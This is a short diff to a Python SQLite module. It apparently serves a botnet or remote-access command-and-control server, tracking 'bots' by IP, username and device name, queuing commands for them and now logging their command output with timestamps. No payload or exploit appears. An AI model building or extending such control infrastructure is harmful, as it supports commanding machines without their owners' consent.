@@ -1,5 +1,6 @@
 import sqlite3 as sql
 import time
+import json
 
 def add_bot_to_db(conn: sql.Connection, id, checkin, ip="", networkaddresses="", username="", devicename=""):
     cur = conn.cursor()
@@ -77,7 +78,8 @@ def update_commandqueue(conn: sql.Connection, id, cmd):
     conn.commit()
 
 
-def update_commandout(conn: sql.Connection, id, cmdout):
+def update_commandout(conn: sql.Connection, uuid, command, output):
     cur = conn.cursor()
-    cur.execute("UPDATE bots SET commandout = ? WHERE uuid=?", (cmdout, id))
+    checkin = int(time.time())
+    cur.execute("INSERT INTO output (uuid, time, command, output) VALUES (?, ?, ?, ?)", (uuid, checkin, command, output))
     conn.commit()
